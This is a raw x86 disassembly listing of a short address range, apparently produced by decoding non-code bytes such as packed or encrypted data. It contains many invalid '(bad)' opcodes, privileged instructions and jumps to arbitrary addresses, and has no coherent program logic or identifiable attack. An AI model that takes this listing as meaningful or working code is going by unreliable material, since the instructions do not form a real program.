  41763b:	imul   esp,DWORD PTR [edi+ecx*2-0x6a3cbf77],0x74
  417643:	pop    es
  417644:	arpl   WORD PTR [edx-0x48bb101f],cx
  41764a:	cli    
  41764b:	mov    al,BYTE PTR [esp+ebp*1+0x51]
  41764f:	mov    al,ds:0xacd6e205
  417654:	jae    0x4176c6
  417656:	push   esi
  417657:	cmp    DWORD PTR [ebx],eax
  417659:	or     al,0x96
  41765b:	into   
  41765c:	xchg   ebp,eax
  41765d:	xor    BYTE PTR [edx],0xc9
  417660:	jne    0x4175f2
  417662:	ins    DWORD PTR es:[edi],dx
  417663:	pop    ebp
  417664:	ins    BYTE PTR es:[edi],dx
  417665:	adc    BYTE PTR [ebp-0x36c13ac4],0x59
  41766c:	or     dh,ch
  41766e:	or     bl,BYTE PTR [esi+0x4b]
  417671:	dec    edi
  417672:	je     0x4176e4
  417674:	or     al,0xaa
  417676:	xlat   BYTE PTR ds:[ebx]
  417677:	sub    ebx,esi
  417679:	fnstenv [ebx-0x4fa23685]
  41767f:	xor    DWORD PTR [ebx],esp
  417681:	dec    eax
  417682:	fnstsw WORD PTR [edx]
  417684:	xor    al,0x79
  417686:	enter  0x259c,0xfe
  41768a:	sub    eax,0xe047681
  41768f:	dec    ebp
  417690:	cmp    al,0x4c
  417692:	sbb    ebp,DWORD PTR ds:0xb94a884d
  417698:	mov    esp,ss
  41769a:	inc    edi
  41769b:	cmp    esp,esi
  41769d:	push   ds
  41769e:	jns    0x417659
  4176a0:	cmp    eax,0x8bb3e3d3
  4176a5:	mov    ebp,0x40abe080
  4176aa:	mov    DWORD PTR [edi+eax*8],esi
  4176ad:	inc    ecx
  4176ae:	lds    ebx,FWORD PTR [edx-0x42d1fe71]
  4176b4:	mov    esi,0x6bfd29c9
  4176b9:	sar    DWORD PTR [ecx],0x4a
  4176bc:	or     eax,0x2dd5dc9c
  4176c1:	xor    edi,ebx
  4176c3:	sahf   
  4176c4:	ret    
  4176c5:	inc    esi
  4176c6:	push   ecx
  4176c7:	mov    ebx,0x8f7512e7
  4176cc:	mov    eax,ds:0xb6c935df
  4176d1:	lock cmc 
  4176d3:	fsub   QWORD PTR [edi+0x27013859]
  4176d9:	jnp    0x41769a
  4176db:	xlat   BYTE PTR ds:[ebx]
  4176dc:	(bad)  
  4176dd:	adc    DWORD PTR [ebx+0xcf26279],ebx
  4176e3:	push   esi
  4176e4:	mov    cl,0x19
  4176e6:	mov    ds:0x34c2baad,al
  4176eb:	(bad)  
  4176ec:	dec    eax
  4176ed:	outs   dx,BYTE PTR ds:[esi]
  4176ee:	hlt    
  4176ef:	cld    
  4176f0:	or     eax,0x4a14b5d9
  4176f5:	sub    al,0x5
  4176f7:	pop    ebx
  4176f8:	inc    ebx
  4176f9:	popf   
  4176fa:	push   cs
  4176fb:	cmp    eax,0xa5a9619b
  417700:	pop    ecx
  417701:	call   0x8602c8ed
  417706:	and    BYTE PTR [edi+esi*4-0x78],dl
  41770a:	loopne 0x417735
  41770c:	or     DWORD PTR [ecx],ebx
  41770e:	add    edx,DWORD PTR [edx+0x19]
  417711:	and    BYTE PTR [ecx+0x40],0x44
  417715:	sbb    ch,BYTE PTR [esi]
  417717:	scas   eax,DWORD PTR es:[edi]
  417718:	push   ds
  417719:	add    esi,DWORD PTR [edx+0x4f663766]
  41771f:	fist   WORD PTR [esi-0x5dff90e6]
  417725:	add    bl,dl
  417727:	jle    0x417721
  417729:	dec    esi
  41772a:	add    ebp,DWORD PTR [esi+eax*2]
  41772d:	in     al,dx
  41772e:	pop    esp
  41772f:	fisttp QWORD PTR [eax]
  417731:	jne    0x4176e0
  417733:	and    cl,dl
  417735:	add    eax,DWORD PTR [ebx+0x41f63603]
  41773b:	or     DWORD PTR [ebx],esp
  41773d:	popa   
  41773e:	mov    dh,cl
  417740:	inc    eax
  417741:	addr16 adc eax,0x96ed3f2f
  417747:	jne    0x4177c1
  417749:	mov    esp,0x75dcb4df
  41774e:	into   
  41774f:	(bad)
  417753:	adc    al,0x8b
  417755:	xor    eax,edx
  417757:	cli    
  417758:	inc    ecx
  41775a:	mov    cl,0xd8
  41775c:	xchg   ebx,eax
  41775d:	daa    
  41775e:	xor    bh,BYTE PTR [ecx]
  417760:	sub    edx,esi
  417762:	xchg   esi,eax
  417763:	nop
  417764:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417765:	loopne 0x41771c
  417767:	dec    eax
  417768:	rcl    DWORD PTR [edi+0x1a],0x91
  41776c:	fmul   st(7),st
  41776e:	retf   
  41776f:	and    DWORD PTR [eax],ecx
  417771:	mov    al,0xa2
  417774:	call   0xc2e1b7c5
  417779:	mov    bh,0x7e
  41777b:	dec    edx
  41777c:	fdivp  st(6),st
  41777e:	mov    al,0xa0
  417780:	dec    ecx
  417781:	pop    ebx
  417782:	aad    0xa3
  417784:	dec    ecx
  417785:	dec    ebx
  417786:	jo     0x417776
  417788:	push   edx
  417789:	adc    al,0x32
  41778b:	xor    DWORD PTR [eax+0xd],edx
  41778e:	neg    DWORD PTR [eax]
  417790:	sbb    dh,al
  417792:	jle    0x417792
  417794:	pop    edi
  417795:	add    BYTE PTR [edi+0x5f],dl
  417798:	jl     0x4177fd
  41779a:	fiadd  DWORD PTR [edx]
  41779c:	pop    ecx
  41779d:	and    BYTE PTR [edi-0x7ff9245e],ah
  4177a3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4177a4:	in     al,0x87
  4177a6:	shl    BYTE PTR [ecx],1
  4177a8:	enter  0xfc83,0xa
  4177ac:	repnz outs dx,DWORD PTR ds:[esi]
  4177ae:	pop    es
  4177af:	push   ebp
  4177b0:	push   esp
  4177b1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4177b2:	loopne 0x417782
  4177b4:	dec    eax
  4177b5:	xchg   BYTE PTR [edx],cl
  4177b7:	(bad)  
  4177b8:	jno    0x417775
  4177ba:	cwde   
  4177bb:	sbb    DWORD PTR [ebp+edi*1-0x57],0xffffffe7
  4177c0:	adc    edx,ebp
  4177c2:	sar    ecx,0x5f
  4177c5:	sub    DWORD PTR [eax+0x4b],ebx
  4177c8:	addr16 into 
  4177ca:	add    al,0x3d
  4177cc:	inc    edi
  4177cd:	mov    eax,esi
  4177cf:	imul   esi,edi,0xffffff85
  4177d2:	or     esp,ebp
  4177d4:	and    eax,ebp
  4177d6:	jo     0x4177da
  4177d8:	mov    eax,ds:0xbb87eb66
  4177dd:	push   cs
  4177de:	xor    al,0xa3
  4177e0:	sbb    eax,0x3e135974
  4177e5:	pop    ds
  4177e6:	shl    DWORD PTR [edx],0xe0
  4177e9:	or     dl,BYTE PTR [ecx]
  4177eb:	sbb    eax,0x71f90e9d
  4177f0:	call   FWORD PTR [esi]
  4177f2:	sub    BYTE PTR [edi+0x4d7c52ae],ah
  4177f8:	or     al,0xec
  4177fa:	xchg   ebp,eax
  4177fb:	(bad)  
  4177fc:	jb     0x4177fc
  4177fe:	dec    ebx
  4177ff:	jae    0x41787b
  417801:	cdq    
  417802:	jp     0x417865
  417804:	xchg   ecx,eax
  417805:	jmp    0x417803
  417807:	and    al,dl
  417809:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41780a:	sub    DWORD PTR [ebp-0x6c],ebp
  41780d:	lahf   
  41780e:	dec    esi
  41780f:	loop   0x417819
  417811:	dec    edi
  417812:	inc    edx
  417813:	xchg   ecx,eax
  417814:	jo     0x4177fc
  417816:	lds    edx,FWORD PTR [edx-0x4e]
  417819:	loope  0x41788b
  41781b:	xor    al,0xd6
  41781d:	lea    esi,[ebp+0x23f0659f]
  417823:	fild   DWORD PTR [edx]
  417825:	mov    eax,0x93cae860
  41782a:	cmp    DWORD PTR [esi],0x54d9fb8b
  417830:	dec    ebx
  417831:	lods   al,BYTE PTR ds:[esi]
  417832:	std    
  417833:	xchg   esp,eax
  417834:	dec    esi
  417835:	xor    eax,0x70b7ea0e
  41783a:	and    eax,0x806f181f
  41783f:	jb     0x417863
  417841:	rcl    bl,1
  417843:	inc    esp
  417844:	stos   DWORD PTR es:[edi],eax
  417845:	stc    
  417846:	and    ebp,ecx
  417848:	jns    0x4178c1
  41784a:	adc    eax,0x62f3ebb3
  41784f:	fstp   TBYTE PTR [edi]
  417851:	push   0x43a964a0
  417856:	jb     0x4178b7
  417858:	sbb    DWORD PTR [esi],ecx
  41785a:	xchg   esp,eax
  41785b:	loope  0x4177eb
  41785d:	jo     0x4178cd
  41785f:	lahf   
  417860:	shl    DWORD PTR [ecx+esi*2],1
  417863:	or     DWORD PTR [eax-0xbe76169],esi
  417869:	in     al,dx
  41786a:	fidivr WORD PTR [esi+0x3367f1c9]
  417870:	xchg   edi,eax
  417871:	lds    esi,FWORD PTR [eax]
  417873:	add    eax,0x5626ac9f
  417878:	repnz pop ds
  41787a:	cmp    al,0x80
  41787c:	(bad)  
  41787d:	aas    
  41787e:	out    0x1b,al
  417880:	gs aad 0x71
  417883:	cwde   
  417884:	loope  0x4178bf
  417886:	fld    QWORD PTR [edi-0x6]
  417889:	leave  
  41788a:	ret    0xd181
  41788d:	push   edx
  41788e:	pop    ds
  41788f:	fsub   DWORD PTR [edx]
  417891:	cdq    
  417892:	adc    al,0xb
  417894:	ins    DWORD PTR es:[edi],dx
  417895:	dec    esi
  417896:	js     0x41788a
  417898:	and    dl,BYTE PTR [ebx-0x4e5de1d1]
  41789e:	mov    eax,ds:0x86f05a
  4178a3:	mov    ebp,0x13ae52c5
  4178a8:	ficom  WORD PTR [edx-0x50]
  4178ab:	dec    eax
  4178ac:	jno    0x417880
  4178ae:	fisub  WORD PTR [ebx+eiz*1+0x4cfc69bb]
  4178b5:	(bad)  
  4178b6:	mov    ebp,0x748875b6
  4178bb:	dec    ebx
  4178bc:	and    ebx,ebx
  4178be:	pop    edx
  4178bf:	lods   eax,DWORD PTR ds:[esi]
  4178c0:	jecxz  0x4178f5
  4178c2:	cdq    
  4178c3:	data16 lods al,BYTE PTR gs:[esi]
  4178c6:	adc    DWORD PTR [esi+eax*2-0x16f5320a],edi
  4178cd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4178ce:	nop
  4178cf:	clc    
  4178d0:	inc    edi
  4178d1:	adc    al,0xcf
  4178d3:	push   ebx
  4178d4:	dec    edx
  4178d5:	dec    ecx
  4178d6:	and    BYTE PTR [ecx-0x4441b2f3],cl
  4178dc:	cmp    ebx,esp
  4178de:	(bad)  
  4178df:	push   esi
  4178e0:	ja     0x41787a
  4178e2:	xor    ebp,DWORD PTR [ecx-0x7983ceff]
  4178e8:	adc    dh,BYTE PTR [edi]
  4178ea:	bound  ebp,QWORD PTR [ebp+0x69]
  4178ed:	aad    0x62
  4178ef:	mov    esi,DWORD PTR [ebp-0x63]
  4178f2:	(bad)  
  4178f3:	mov    al,0xae
  4178f5:	xlat   BYTE PTR ds:[ebx]
  4178f6:	xor    BYTE PTR [esi+eax*2-0x6],dl
  4178fa:	stos   BYTE PTR es:[edi],al
  4178fb:	push   0x8392b089
  417900:	nop
  417901:	outs   dx,DWORD PTR ds:[esi]
  417902:	mov    dl,0x9d
  417904:	pop    ds
  417905:	iret   
  417906:	sub    DWORD PTR [ebp-0x4e8cf532],ecx
  41790c:	add    DWORD PTR [ebp-0x17],esi
  41790f:	loope  0x417898
  417911:	xor    eax,0x2c272f8
  417916:	shl    cl,1
  417918:	sbb    DWORD PTR [eax-0x792d34ac],0x31f8edd7
  417922:	out    dx,eax
  417923:	int3   
  417924:	push   es
  417925:	repz push esp
  417927:	xchg   ecx,eax
  417928:	outs   dx,DWORD PTR ds:[esi]
  417929:	imul   edi,DWORD PTR [ebx-0x1d52ec44],0xffffffbd
  417930:	lahf   
  417931:	leave  
  417932:	xor    DWORD PTR [edi+0x14],0x58
  417936:	lea    esp,[esp+ebp*8+0x4f]
  41793a:	popf   
  41793b:	(bad)  
  41793c:	sub    eax,0xfee9652c
  417941:	xchg   DWORD PTR [ebx+0x3a],esp
  417944:	ret    
  417945:	mov    dl,0x9
  417947:	out    0x64,al
  417949:	xchg   esp,eax
  41794a:	enter  0x7e81,0xf2
  41794e:	push   edi
  41794f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417950:	cmp    eax,0x2b4c9bf9
  417955:	nop
  417956:	std    
  417957:	lock xchg ebp,eax
  417959:	and    DWORD PTR ds:0x90a53e98,0x80ff6d5b
  417963:	mov    ebp,0xadad5
  417968:	in     eax,dx
  417969:	mov    bh,0x3a
  41796b:	inc    esp
  41796c:	xchg   esp,eax
  41796d:	inc    ebp
  41796e:	jge    0x4179b3
  417970:	ret    0x9f64
  417973:	cwde   
  417974:	jb     0x4179a5
  417976:	(bad)  
  417977:	(bad)  [esi-0x33]
  41797a:	in     al,dx
  41797b:	(bad)  
  41797c:	sub    edx,DWORD PTR [ecx-0x35]
  41797f:	sub    eax,0x311dcf05
  417984:	leave  
  417985:	cdq    
  417986:	sbb    BYTE PTR [esi],ah
  417988:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417989:	mov    ebp,0xb5e49535
  41798e:	mov    cl,0xef
  417990:	cmp    al,0x3c
  417992:	outs   dx,BYTE PTR ds:[esi]
  417993:	fist   DWORD PTR [esp+eiz*4]
  417996:	jmp    FWORD PTR gs:[esi]
  417999:	enter  0x5af3,0x31
  41799d:	sub    ecx,eax
  41799f:	aad    0xac
  4179a1:	bnd call 0xdaade4a5
  4179a7:	mov    dh,0x85
  4179a9:	jne    0x417a18
  4179ab:	jmp    0x41794f
  4179ad:	inc    ebx
  4179ae:	mov    esi,0x4412a155
  4179b3:	cmp    eax,0xee6a0044
  4179b8:	retf   0x9324
  4179bb:	pop    ebp
  4179bc:	test   DWORD PTR [ebx-0x12],0x834b005a
  4179c3:	das    
  4179c4:	cmp    dh,BYTE PTR [ecx+0x1cdb7c76]
  4179ca:	test   DWORD PTR ds:[edx+0x34aea429],edi
  4179d1:	int3   
  4179d2:	push   esi
  4179d3:	pop    ecx
  4179d4:	pop    ds
  4179d5:	push   cs
  4179d6:	fadd   st(2),st
  4179d8:	mov    ecx,0x451d8445
  4179dd:	mov    BYTE PTR [ebx],bh
  4179df:	mov    al,ds:0x3c5ec713
  4179e4:	mov    ch,0xa0
  4179e6:	cmc    
  4179e7:	jno    0x4179ba
  4179e9:	sar    BYTE PTR [esi-0x3e],0xe0
  4179ed:	fldcw  WORD PTR [esi+0x19028c45]
  4179f3:	pushf  
  4179f4:	fwait
  4179f5:	aas    
  4179f6:	ror    DWORD PTR [ebx-0x27],0xc1
  4179fa:	lds    ebp,FWORD PTR [ebx]
  4179fc:	fs cmp al,0xab
  4179ff:	ins    BYTE PTR es:[edi],dx
  417a00:	xor    al,0x2d
  417a02:	or     esp,edi
  417a04:	jecxz  0x4179ab
  417a06:	fwait
  417a07:	sub    eax,0xbc3d9b59
  417a0c:	add    bh,ah
  417a0e:	push   ebx
  417a0f:	xchg   ebx,eax
  417a10:	xchg   esi,eax
  417a11:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417a12:	pop    esi
  417a13:	in     eax,0x5a
  417a15:	popa   
  417a16:	cmp    BYTE PTR [ecx+0x7bc798fa],ch
  417a1c:	mov    dh,0xcc
  417a1e:	fmul   DWORD PTR [ecx-0x2a]
  417a21:	push   cs
  417a22:	adc    DWORD PTR [edx+0x20c3b299],eax
  417a28:	sar    bl,0x2b
  417a2b:	push   cs
  417a2c:	retf   0xbc8
  417a2f:	icebp  
  417a30:	mov    ds:0x12e29728,eax
  417a35:	sbb    DWORD PTR [ecx],edi
  417a37:	or     al,0xf9
  417a39:	out    0xad,eax
  417a3b:	test   eax,0xa6628d64
  417a40:	sub    al,0xae
  417a42:	sub    BYTE PTR [edx],cl
  417a44:	sti    
  417a45:	iret   
  417a46:	pop    es
  417a47:	je     0x417aaa
  417a49:	adc    eax,0x21d5a7a
  417a4e:	pop    esi
  417a4f:	dec    esi
  417a50:	sahf   
  417a51:	imul   esi,DWORD PTR [eax+0x49],0x7d
  417a55:	cmp    DWORD PTR [ebx-0x34206dd0],ebx
  417a5b:	sub    esi,esp
  417a5d:	dec    edx
  417a5e:	cwde   
  417a5f:	mov    ah,0x10
  417a61:	ret    
  417a62:	and    eax,0x780a6c4e
  417a67:	rcr    DWORD PTR [ecx-0x60],1
  417a6a:	test   al,0x90
  417a6c:	pusha  
  417a6d:	fs mov cl,0xbb
  417a70:	add    esp,DWORD PTR [edx+ecx*8]
  417a73:	mov    ch,0xcf
  417a75:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417a76:	retf   0xfeee
  417a79:	mov    edi,0xfcf509ae
  417a7e:	out    0x25,al
  417a80:	jne    0x417a2b
  417a82:	mov    ds:0x76dda2fd,eax
  417a87:	xor    eax,0x4bd232d0
  417a8c:	add    BYTE PTR [ebx+ecx*4],bh
  417a8f:	adc    DWORD PTR [ebp-0x767e9865],ebp
  417a95:	(bad)  
  417a96:	mov    ds:0x54837135,eax
  417a9b:	mov    ah,0xf0
  417a9d:	mov    eax,0x893f3389
  417aa2:	aas    
  417aa3:	cwde   
  417aa4:	ins    BYTE PTR es:[edi],dx
  417aa5:	lahf   
  417aa6:	push   es
  417aa7:	xor    al,0x7b
  417aa9:	cdq    
  417aaa:	xor    eax,0x8bccca73
  417aaf:	out    0xc,al
  417ab1:	mov    bl,0x90
  417ab3:	sub    eax,DWORD PTR [edx-0x766778a8]
  417ab9:	ss lahf 
  417abb:	in     eax,0x33
  417abd:	mov    ds:0x88bf073d,al
  417ac2:	mov    bl,0xeb
  417ac4:	fisttp DWORD PTR [ecx+0x31085f1e]
  417aca:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417acb:	in     al,0x7
  417acd:	out    dx,al
  417ace:	xchg   ecx,eax
  417acf:	retf   
  417ad0:	sbb    bh,BYTE PTR [ebx+0x6b]
  417ad3:	cdq    
  417ad4:	es mov eax,0x941ced32
  417ada:	add    BYTE PTR ds:0x608d776,cl
  417ae0:	sub    al,0x30
  417ae2:	stos   BYTE PTR es:[edi],al
  417ae3:	frstor [edx]
  417ae5:	and    eax,0x4b7591e4
  417aea:	jns    0x417a97
  417aec:	dec    ebp
  417aed:	dec    ebp
  417aee:	pop    esp
  417aef:	or     ecx,esp
  417af1:	push   edx
  417af2:	xor    eax,0xff59c8f2
  417af7:	ficomp WORD PTR [ebx-0x10f6be6e]
  417afd:	adc    dh,BYTE PTR [edx]
  417aff:	pop    eax
  417b00:	sbb    DWORD PTR [edx-0x7f],edi
  417b03:	jle    0x417b29
  417b05:	add    DWORD PTR [edi],ecx
  417b07:	mov    ebp,edx
  417b09:	cwde   
  417b0a:	sbb    BYTE PTR [eax],al
  417b0c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417b0d:	sbb    eax,0x81fe80b1
  417b12:	gs retf 0x1da5
  417b16:	sub    eax,0x4c8121e6
  417b1b:	jle    0x417aa4
  417b1d:	xor    al,0x32
  417b1f:	data16 mov al,ds:0x23e57eba
  417b25:	ret    
  417b26:	sub    esp,DWORD PTR [edx+edi*2]
  417b29:	aas    
  417b2a:	cli    
  417b2b:	inc    edi
  417b2c:	std    
  417b2d:	mov    ecx,0xed09e015
  417b32:	cmp    ah,BYTE PTR [edi+0x67459c69]
  417b38:	test   al,0x63
  417b3a:	xor    ch,BYTE PTR [eax+0xd41e7f6]
  417b40:	mov    es,WORD PTR [edi-0x699c1e5d]
  417b46:	or     eax,0x825d1f37
  417b4b:	push   esi
  417b4c:	cli    
  417b4d:	xlat   BYTE PTR ds:[ebx]
  417b4e:	dec    edi
  417b4f:	and    eax,0x875dcc0b
  417b54:	mov    BYTE PTR [ebp+0x0],al
  417b57:	mov    edi,ebp
  417b59:	add    DWORD PTR [ecx],edi
  417b5b:	inc    edx
  417b5c:	mov    ebx,0x6020b1d1
  417b61:	adc    DWORD PTR [edx],edx
  417b63:	sub    eax,0x8c495bd4
  417b68:	add    edx,DWORD PTR [ebx]
  417b6a:	sbb    ecx,DWORD PTR [edi-0x5f]
  417b6d:	jae    0x417b7d
  417b6f:	stos   DWORD PTR es:[edi],eax
  417b70:	retf   
  417b71:	mov    ds:0x114f63,al
  417b76:	mov    dl,0x23
  417b78:	repnz (bad) 
  417b7a:	dec    edx
  417b7b:	inc    edx
  417b7c:	lds    esi,FWORD PTR [ecx+edx*8]
  417b7f:	fstp   TBYTE PTR [edi+0x289a6c00]
  417b85:	and    eax,0x7d1389dd
  417b8a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417b8b:	sbb    eax,0x5a36df66
  417b90:	inc    esp
  417b91:	push   ss
  417b92:	cs pop ds
  417b94:	ds jg  0x417b22
  417b97:	sar    ebp,cl
  417b99:	ins    DWORD PTR es:[edi],dx
  417b9a:	in     al,dx
  417b9b:	push   esi
  417b9c:	pop    esi
  417b9d:	push   edx
  417b9e:	aaa    
  417b9f:	adc    al,0xa7
  417ba1:	(bad)  
  417ba2:	pop    es
  417ba3:	pop    edi
  417ba4:	add    DWORD PTR [edi-0xb],esi
  417ba7:	sar    DWORD PTR [ebp-0x11e2e702],cl
  417bad:	mov    ecx,0xf6173685
  417bb2:	sub    edi,DWORD PTR [ecx+ecx*8-0x3c]
  417bb6:	add    al,0xd2
  417bb8:	jmp    0x41f2dffb
  417bbd:	aad    0x41
  417bbf:	inc    ebp
  417bc0:	leave  
  417bc1:	jno    0x417be1
  417bc3:	(bad)  
  417bc4:	in     al,0x9e
  417bc6:	popf   
  417bc7:	or     al,0xba
  417bc9:	inc    eax
  417bca:	fiadd  DWORD PTR [edx+0x71b2b8d4]
  417bd0:	xchg   ebp,eax
  417bd1:	adc    dl,0xfa
  417bd4:	rcr    ch,0x12
  417bd7:	cmp    BYTE PTR [edx+0x7e],dl
  417bda:	bound  ebp,QWORD PTR [ebx]
  417bdc:	fmul   QWORD PTR [edi-0x63]
  417bdf:	call   0xc68f:0x7f6c6fbd
  417be6:	push   0x71
  417be8:	into   
  417be9:	xchg   esi,eax
  417bea:	xor    eax,0x238808e6
  417bef:	mov    edx,0xf70aee50
  417bf4:	ins    BYTE PTR es:[edi],dx
  417bf5:	push   edx
  417bf6:	mov    eax,ds:0xe620518d
  417bfb:	loopne 0x417c52
  417bfd:	sub    ebx,DWORD PTR [esp+ebp*8]
  417c00:	out    dx,eax
  417c01:	mov    ds:0x8c489cd8,eax
  417c06:	mov    al,ds:0xe2997c5c
  417c0b:	push   DWORD PTR [ebp+0x2f]
  417c0e:	fsubr  DWORD PTR [ecx]
  417c10:	sub    al,0xbb
  417c12:	sti    
  417c13:	and    bl,bh
  417c15:	lea    ebx,[bp+si+0x1f]
  417c19:	in     al,0xc3
  417c1b:	clc    
  417c1c:	and    BYTE PTR [edx+ebx*1],al
  417c1f:	push   esp
  417c20:	xchg   ecx,ecx
  417c22:	mov    DWORD PTR ds:0x789e35ae,ecx
  417c28:	pusha  
  417c29:	push   ss
  417c2a:	inc    ebx
  417c2b:	hlt    
  417c2c:	aad    0x17
  417c2e:	(bad)  
  417c2f:	and    BYTE PTR [esi+0x4d897132],cl
  417c35:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417c36:	scas   al,BYTE PTR es:[edi]
  417c37:	(bad)  
  417c38:	xor    BYTE PTR [ebp+0x36],ah
  417c3b:	(bad)  
  417c3c:	mov    bl,0xd
  417c3e:	mov    bl,BYTE PTR [ebp-0x2c40958f]
  417c44:	shr    BYTE PTR [ebp-0x62],1
  417c47:	dec    ebp
  417c48:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417c49:	dec    ebx
  417c4a:	mov    ah,0xf8
  417c4c:	push   edx
  417c4d:	push   ss
  417c4e:	add    eax,0xc0fae3d1
  417c53:	mov    edi,0xc1940992
  417c58:	and    BYTE PTR [eax+0x163b7f42],0x6
  417c5f:	jl     0x417cd5
  417c61:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417c62:	jo     0x417bfb
  417c64:	js     0x417c06
  417c66:	add    edi,DWORD PTR [esi+0x6c]
  417c69:	lds    edi,FWORD PTR [eax]
  417c6b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417c6c:	mov    WORD PTR ds:0x88a16542,?
  417c72:	push   cs
  417c73:	cmp    DWORD PTR [edx],edi
  417c75:	shl    DWORD PTR [ecx+0xd],cl
  417c78:	mov    edi,0xadf52166
  417c7d:	adc    DWORD PTR [eax-0x22a62c2a],edi
  417c83:	test   DWORD PTR [edi+0xf845ded],edi
  417c89:	adc    al,0x47
  417c8b:	imul   ebx,DWORD PTR [edx],0x7b
  417c8e:	cld    
  417c8f:	inc    esp
  417c90:	adc    BYTE PTR [ecx+0x31aab751],0x60
  417c97:	jno    0x417c19
  417c99:	or     bh,dh
  417c9b:	icebp  
  417c9c:	mov    es,WORD PTR ss:[eax+0x6c]
  417ca0:	shr    DWORD PTR [edi+0x609fe130],cl
  417ca6:	sub    eax,DWORD PTR [ecx+0x26]
  417ca9:	xor    al,0x68
  417cab:	in     eax,dx
  417cac:	popa   
  417cad:	scas   al,BYTE PTR es:[edi]
  417cae:	sbb    ecx,esi
  417cb0:	or     eax,0x40e1d8fd
  417cb5:	xor    ecx,0xe32939ab
  417cbb:	pop    ecx
  417cbc:	xor    al,0xd9
  417cbe:	jae    0x417cbd
  417cc0:	lds    esp,FWORD PTR [eax]
  417cc2:	or     al,0xd
  417cc4:	push   cs
  417cc5:	imul   ecx,DWORD PTR [edi],0xffffff88
  417cc8:	in     eax,dx
  417cc9:	push   ss
  417cca:	xor    al,0x47
  417ccc:	repnz repnz lahf 
  417ccf:	addr16 jp 0x417c54
  417cd2:	dec    ecx
  417cd3:	pop    ecx
  417cd4:	xchg   edx,eax
  417cd5:	push   ds
  417cd6:	jge    0x417ca0
  417cd8:	inc    esp
  417cd9:	(bad)  
  417cda:	xchg   edi,eax
  417cdb:	lods   eax,DWORD PTR ds:[esi]
  417cdc:	xor    al,0xfb
  417cde:	(bad)  
  417cdf:	fdiv   DWORD PTR [esp+eax*1+0x44d46ade]
  417ce6:	dec    edx
  417ce7:	nop
  417ce8:	ror    BYTE PTR [ebx+0x46],0x81
  417cec:	pop    ds
  417ced:	mov    ah,0xb1
  417cef:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417cf0:	rcr    DWORD PTR [edx],1
  417cf2:	and    dl,al
  417cf4:	mov    ecx,0x64fc5bae
  417cf9:	mov    BYTE PTR [ebx-0x62a453dd],cl
  417cff:	leave  
  417d00:	loopne 0x417d0b
  417d02:	mov    al,0x62
  417d04:	call   0xe92e:0xa9e84b34
  417d0b:	xchg   DWORD PTR [edx+edi*1-0x5752c922],esi
  417d12:	(bad)  
  417d13:	cli    
  417d14:	inc    eax
  417d15:	imul   esp
  417d17:	push   ebx
  417d18:	pop    edx
  417d19:	adc    DWORD PTR [eax+0xf],ecx
  417d1c:	or     al,0x97
  417d1e:	in     al,0xb7
  417d20:	call   0xee8d:0x4aca2d97
  417d27:	repnz add BYTE PTR ds:0x25ff979,0x84
  417d2f:	inc    eax
  417d30:	mov    cl,0x5
  417d32:	cmp    al,BYTE PTR [edi+eax*4+0x23]
  417d36:	jmp    0x417cc4
  417d38:	mov    al,0x44
  417d3a:	fistp  QWORD PTR [ebp-0x67cb74b4]
  417d40:	adc    ebp,DWORD PTR [eax-0x4dabf042]
  417d46:	push   es
  417d47:	pop    es
  417d48:	loop   0x417d27
  417d4a:	push   ecx
  417d4b:	outs   dx,BYTE PTR ds:[esi]
  417d4c:	xor    BYTE PTR [esi+eax*2+0x67f3b977],al
  417d53:	xchg   ebp,eax
  417d54:	adc    BYTE PTR [eax+0x1e1768c0],ah
  417d5a:	lods   eax,DWORD PTR ds:[esi]
  417d5b:	scas   al,BYTE PTR es:[edi]
  417d5c:	adc    BYTE PTR [eax+ecx*2+0x6],dh
  417d60:	aad    0xbb
  417d62:	dec    eax
  417d63:	xlat   BYTE PTR ds:[ebx]
  417d64:	cs and eax,0x12139473
  417d6a:	cmp    eax,0x5e0557c9
  417d6f:	add    edx,eax
  417d71:	jnp    0x417ddd
  417d73:	in     eax,dx
  417d74:	out    dx,eax
  417d75:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417d76:	mov    DWORD PTR [edi+0x8],esp
  417d79:	lods   al,BYTE PTR ds:[si]
  417d7b:	mov    dl,0x5f
  417d7d:	jb     0x417d62
  417d7f:	jno    0x417d89
  417d81:	dec    ebx
  417d82:	cmp    bh,BYTE PTR [eax-0x6a]
  417d85:	cmp    eax,0x8f48a0b9
  417d8a:	scas   eax,DWORD PTR es:[edi]
  417d8b:	lds    ebp,FWORD PTR [esi+0x6c0ade6c]
  417d91:	stos   DWORD PTR es:[edi],eax
  417d92:	mov    esi,0x12108fe2
  417d97:	adc    bh,BYTE PTR [edx+ebp*1+0x3a6b7c95]
  417d9e:	out    0xdc,al
  417da0:	mov    dl,0xd5
  417da2:	sbb    al,0x8b
  417da4:	leave  
  417da5:	mov    al,ds:0xb8857ed5
  417daa:	fcomp  DWORD PTR [ebx]
  417dac:	sub    ebp,DWORD PTR [eax-0x55]
  417daf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417db0:	jbe    0x417e14
  417db2:	(bad)  
  417db3:	push   esp
  417db4:	pop    ss
  417db5:	dec    eax
  417db6:	fidivr DWORD PTR [edx+0x2aac9c68]
  417dbc:	jmp    0x417e2f
  417dbe:	cmp    al,0x79
  417dc0:	inc    esp
  417dc1:	cmp    eax,ecx
  417dc3:	aad    0x3f
  417dc5:	es jb  0x417d98
  417dc8:	lahf   
  417dc9:	iret   
  417dca:	adc    DWORD PTR [eax+0x57],ecx
